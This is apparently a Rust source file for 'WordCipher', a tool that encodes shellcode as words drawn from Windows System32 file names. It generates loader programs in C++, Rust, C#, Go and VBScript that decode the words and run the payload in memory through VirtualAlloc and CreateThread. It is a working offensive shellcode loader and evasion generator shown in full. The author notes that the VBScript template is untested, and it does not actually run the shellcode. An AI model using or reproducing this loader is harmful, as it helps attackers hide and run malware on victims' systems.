use std::path::{Path, PathBuf};
use std::fs;
use std::collections::HashSet;
use rand::seq::SliceRandom;
use clap::{Arg, Command};

#[derive(Debug)]
struct Args {
    input_file: PathBuf,
    output_file: PathBuf,
    template_name: String,
}

fn parse_args() -> Args {
    let matches = Command::new("WordCipher")
        .version("1.0")
        .author("Your Name <your.email@example.com>")
        .about("Encrypts shellcode and generates output in different programming languages")
        .arg(
            Arg::new("input")
                .short('i')
                .long("input")
                .value_name("INPUT_FILE")
                .help("Path to the input shellcode file")
                .num_args(1)
                .required(true),
        )
        .arg(
            Arg::new("output")
                .short('o')
                .long("output")
                .value_name("OUTPUT_FILE")
                .help("Path to the output file")
                .num_args(1)
                .required(true),
        )
        .arg(
            Arg::new("template")
                .short('t')
                .long("template")
                .value_name("TEMPLATE")
                .help("The output template format (e.g., cpp, rust, csharp, go, wsh (VBScript))")
                .num_args(1)
                .required(true)
        )
        .get_matches();

    Args {
        input_file: PathBuf::from(matches.get_one::<String>("input").unwrap()),
        output_file: PathBuf::from(matches.get_one::<String>("output").unwrap()),
        template_name: matches.get_one::<String>("template").unwrap().to_string(),
    }

    
}

fn get_words(dir_path: &Path) -> std::io::Result<Vec<String>> {
    let mut unique_names = HashSet::new();
    
    for entry in fs::read_dir(dir_path)? {
        let entry = entry?;
        if entry.file_type()?.is_file() {
            if let Some(name) = entry.path().file_stem() {
                if let Some(name_str) = name.to_str() {
                    unique_names.insert(name_str.to_string());
                }
            }
        }
    }

    let mut names: Vec<_> = unique_names.into_iter().collect();
    println!("Found {} unique words", names.len());
    
    names.shuffle(&mut rand::thread_rng());
    names.truncate(256);
    
    println!("First 5 words in list:");
    for (i, word) in names.iter().take(5).enumerate() {
        println!("Word[{}] = {}", i, word);
    }

    Ok(names)
}

fn encode_shellcode(shellcode: &[u8], word_list: &[String]) -> Vec<String> {
    println!("\nFirst 10 bytes of shellcode:");
    for (i, &byte) in shellcode.iter().take(10).enumerate() {
        println!("Byte[{}] = 0x{:02x} -> {}", i, byte, word_list[byte as usize]);
    }

    shellcode.iter()
        .map(|&byte| word_list[byte as usize].clone())
        .collect()
}

fn verify_encoding(original: &[u8], encoded: &[String], word_list: &[String]) {
    println!("\nVerifying encoding/decoding:");
    
    let mut word_positions = std::collections::HashMap::new();
    for (i, word) in word_list.iter().enumerate() {
        word_positions.insert(word, i);
    }
    
    for i in 0..std::cmp::min(10, original.len()) {
        let original_byte = original[i];
        let encoded_word = &encoded[i];
        let decoded_byte = *word_positions.get(encoded_word).unwrap() as u8;
        println!("Position {}: 0x{:02x} -> {} -> 0x{:02x}", 
                i, original_byte, encoded_word, decoded_byte);
        assert_eq!(original_byte, decoded_byte, "Mismatch at position {}", i);
    }
}

fn generate_output(encoded: &[String], word_list: &[String], template: &str) -> String {
    let encoded_str = encoded.iter()
        .map(|s| format!("\"{}\"", s))
        .collect::<Vec<_>>()
        .join(", ");
    
    let wordlist_str = word_list.iter()
        .map(|s| format!("\"{}\"", s))
        .collect::<Vec<_>>()
        .join(", ");

    match template {
        "cpp" => format!(
            "#include <vector>\n#include <string>\n#include <windows.h>\n#include <stdio.h>\n\ntypedef unsigned char BYTE;\n\nstd::vector<std::string> encodedWords = {{{}}};\n\nstd::vector<std::string> wordList = {{{}}};\n\nstd::vector<BYTE> Decode(const std::vector<std::string>& encoded) {{\n    std::vector<BYTE> shellcode;\n    printf(\"[+] Decoding %zu bytes\\n\", encoded.size());\n    \n    for(const auto& word : encoded) {{\n        for(size_t i = 0; i < wordList.size(); i++) {{\n            if(wordList[i] == word) {{\n                shellcode.push_back((BYTE)i);\n                if(shellcode.size() <= 5) {{\n                    printf(\"[+] Decoded byte %zu: 0x%02x\\n\", shellcode.size()-1, (BYTE)i);\n                }}\n                break;\n            }}\n        }}\n    }}\n    return shellcode;\n}}\n\nint main() {{\n    printf(\"[+] Starting decoder\\n\");\n    auto shellcode = Decode(encodedWords);\n    \n    void* exec = VirtualAlloc(0, shellcode.size(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);\n    printf(\"[+] Allocated memory at %p\\n\", exec);\n    \n    RtlMoveMemory(exec, shellcode.data(), shellcode.size());\n    printf(\"[+] Copied shellcode\\n\");\n    \n    HANDLE hThread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)exec, 0, 0, 0);\n    printf(\"[+] Created thread\\n\");\n    \n    WaitForSingleObject(hThread, INFINITE);\n    return 0;\n}}", 
            encoded_str, 
            wordlist_str
        ),
    
"rust" => format!(
    r#"
use std::ptr;
use std::mem;

#[link(name = "kernel32")]
extern "system" {{
    fn VirtualAlloc(lpAddress: *mut u8, dwSize: usize, flAllocationType: u32, flProtect: u32) -> *mut u8;
    fn CreateThread(lpThreadAttributes: *mut u8, dwStackSize: usize, lpStartAddress: *mut u8, lpParameter: *mut u8, dwCreationFlags: u32, lpThreadId: *mut u32) -> isize;
    fn WaitForSingleObject(hHandle: isize, dwMilliseconds: u32) -> u32;
}}

fn decode(encoded_words: &[&str], word_list: &[&str]) -> Vec<u8> {{
    println!("[+] Decoding shellcode...");
    let mut shellcode = Vec::new();

    for word in encoded_words {{
        for (i, w) in word_list.iter().enumerate() {{
            if w == word {{
                shellcode.push(i as u8);
                break;
            }}
        }}
    }}

    shellcode
}}

fn main() {{
    let encoded_words = &[{}];
    let word_list = &[{}];

    let shellcode = decode(encoded_words, word_list);
    println!("[+] Decoded {{}} bytes", shellcode.len());

    unsafe {{
        let addr = VirtualAlloc(
            ptr::null_mut(),
            shellcode.len(),
            0x1000 | 0x2000,  // MEM_COMMIT | MEM_RESERVE
            0x40,             // PAGE_EXECUTE_READWRITE
        );

        if addr.is_null() {{
            panic!("VirtualAlloc failed");
        }}
        println!("[+] Memory allocated");

        ptr::copy(shellcode.as_ptr(), addr, shellcode.len());
        println!("[+] Shellcode copied");

        let thread = CreateThread(
            ptr::null_mut(),
            0,
            addr,
            ptr::null_mut(),
            0,
            ptr::null_mut(),
        );

        if thread == 0 {{
            panic!("CreateThread failed");
        }}
        println!("[+] Thread created");

        WaitForSingleObject(thread, 0xFFFFFFFF);
    }}
}}"#,
    encoded_str, 
    wordlist_str
),    
        "csharp" => format!(
            "using System;\nusing System.Collections.Generic;\nusing System.Runtime.InteropServices;\n\nclass Program {{\n    [DllImport(\"kernel32.dll\")]\n    static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);\n\n    [DllImport(\"kernel32.dll\")]\n    static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);\n\n    [DllImport(\"kernel32.dll\")]\n    static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);\n\n    [DllImport(\"kernel32.dll\")]\n    static extern IntPtr RtlMoveMemory(IntPtr dest, byte[] src, uint size);\n\n    const uint MEM_COMMIT = 0x1000;\n    const uint MEM_RESERVE = 0x2000;\n    const uint PAGE_EXECUTE_READWRITE = 0x40;\n\n    static byte[] Decode(string[] encodedWords, string[] wordList) {{\n        var shellcode = new List<byte>();\n        Console.WriteLine(\"[+] Decoding shellcode...\");\n\n        foreach (var word in encodedWords) {{\n            var index = Array.IndexOf(wordList, word);\n            if (index != -1) {{\n                shellcode.Add((byte)index);\n            }}\n        }}\n\n        return shellcode.ToArray();\n    }}\n\n    static void Main() {{\n        string[] encodedWords = new string[] {{ {} }};\n        string[] wordList = new string[] {{ {} }};\n\n        byte[] shellcode = Decode(encodedWords, wordList);\n        Console.WriteLine($\"[+] Decoded {{shellcode.Length}} bytes\");\n\n        IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)shellcode.Length, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);\n        Console.WriteLine(\"[+] Memory allocated\");\n\n        RtlMoveMemory(addr, shellcode, (uint)shellcode.Length);\n        Console.WriteLine(\"[+] Shellcode copied\");\n\n        IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);\n        Console.WriteLine(\"[+] Thread created\");\n\n        WaitForSingleObject(hThread, 0xFFFFFFFF);\n    }}\n}}",
            encoded_str,
            wordlist_str
        ),
    
        // This may be complete garbage nonsense. If it doesnt work, let me know and I'll fix it. Or at least try to. I at least wanted to try to make it work.
        "wsh" => format!(
            "Option Explicit\n\nFunction Base64ToStream(b)\n  Dim enc, length, ba, transform, ms\n  Set enc = CreateObject(\"System.Text.ASCIIEncoding\")\n  length = enc.GetByteCount_2(b)\n  Set transform = CreateObject(\"System.Security.Cryptography.FromBase64Transform\")\n  ba = transform.TransformFinalBlock(enc.GetBytes_4(b), 0, length)\n  Set ms = CreateObject(\"System.IO.MemoryStream\")\n  ms.Write ba, 0, UBound(ba) + 1\n  ms.Position = 0\n  Set Base64ToStream = ms\nEnd Function\n\nFunction Decode(encodedWords, wordList)\n    Dim shellcode()\n    ReDim shellcode(UBound(encodedWords))\n    \n    WScript.Echo \"[+] Decoding shellcode...\"\n    \n    Dim i, word, j, found\n    For i = 0 To UBound(encodedWords)\n        word = encodedWords(i)\n        found = False\n        \n        For j = 0 To UBound(wordList)\n            If wordList(j) = word Then\n                shellcode(i) = j\n                found = True\n                Exit For\n            End If\n        Next\n        \n        If Not found Then\n            WScript.Echo \"[-] Word not found: \" & word\n            WScript.Quit\n        End If\n    Next\n    \n    Decode = shellcode\nEnd Function\n\nDim encodedWords: encodedWords = Array({})\nDim wordList: wordList = Array({})\n\nDim shellcode: shellcode = Decode(encodedWords, wordList)\nWScript.Echo \"[+] Decoded \" & UBound(shellcode) + 1 & \" bytes\"\n\nDim objShell: Set objShell = CreateObject(\"WScript.Shell\")\nDim exec: exec = objShell.ExpandEnvironmentStrings(\"%COMSPEC%\")\nobjShell.Run exec",
            encoded_str,
            wordlist_str
        ),
    
        "go" => format!(
            "package main\n\nimport (\n\t\"fmt\"\n\t\"syscall\"\n\t\"unsafe\"\n)\n\nvar (\n\tkernel32      = syscall.NewLazyDLL(\"kernel32.dll\")\n\tvirtualAlloc  = kernel32.NewProc(\"VirtualAlloc\")\n\tcreateThread  = kernel32.NewProc(\"CreateThread\")\n\twaitForObject = kernel32.NewProc(\"WaitForSingleObject\")\n)\n\nfunc Decode(encodedWords []string, wordList []string) []byte {{\n\tshellcode := make([]byte, 0)\n\tfmt.Println(\"[+] Decoding shellcode...\")\n\n\tfor _, word := range encodedWords {{\n\t\tfor i, w := range wordList {{\n\t\t\tif w == word {{\n\t\t\t\tshellcode = append(shellcode, byte(i))\n\t\t\t\tbreak\n\t\t\t}}\n\t\t}}\n\t}}\n\n\treturn shellcode\n}}\n\nfunc main() {{\n\tencodedWords := []string{{{}}};\n\twordList := []string{{{}}};\n\n\tshellcode := Decode(encodedWords, wordList)\n\tfmt.Printf(\"[+] Decoded %d bytes\\n\", len(shellcode))\n\n\taddr, _, err := virtualAlloc.Call(\n\t\t0,\n\t\tuintptr(len(shellcode)),\n\t\t0x1000|0x2000,\n\t\t0x40,\n\t)\n\tif addr == 0 {{\n\t\tpanic(err)\n\t}}\n\tfmt.Println(\"[+] Memory allocated\")\n\n\t// Copy shellcode to allocated memory\n\tfor i := 0; i < len(shellcode); i++ {{\n\t\t*(*byte)(unsafe.Pointer(addr + uintptr(i))) = shellcode[i]\n\t}}\n\tfmt.Println(\"[+] Shellcode copied\")\n\n\thandle, _, err := createThread.Call(\n\t\t0,\n\t\t0,\n\t\taddr,\n\t\tuintptr(0),\n\t\t0,\n\t\t0,\n\t)\n\tif handle == 0 {{\n\t\tpanic(err)\n\t}}\n\tfmt.Println(\"[+] Thread created\")\n\n\twaitForObject.Call(handle, 0xFFFFFFFF)\n}}",
            encoded_str,
            wordlist_str
        ),
        _ => panic!("Unsupported template")
    }

}

fn main() -> Result<(), Box<dyn std::error::Error>> {
    let args = parse_args();

    println!("Generating wordlist...");
    let wordlist = get_words(Path::new(r"C:\Windows\System32"))?;
    if wordlist.len() != 256 {
        return Err("Failed to get exactly 256 words".into());
    }

    println!("\nReading shellcode...");
    let shellcode = fs::read(&args.input_file)?;
    println!("Read {} bytes", shellcode.len());

    println!("\nEncoding shellcode...");
    let encoded = encode_shellcode(&shellcode, &wordlist);
    
    println!("\nVerifying encoding...");
    verify_encoding(&shellcode, &encoded, &wordlist);

    println!("\nGenerating output...");
    let output = generate_output(&encoded, &wordlist, &args.template_name);

    println!("\nWriting output...");
    fs::write(&args.output_file, output)?;

    if args.template_name == "wsh" {
        println!("\n{}", "*".repeat(80));
        println!("I did not test the generated code for VBS. It may not work.");
        println!("{}\n", "*".repeat(80));
    }

    println!("Done!");
    Ok(())
}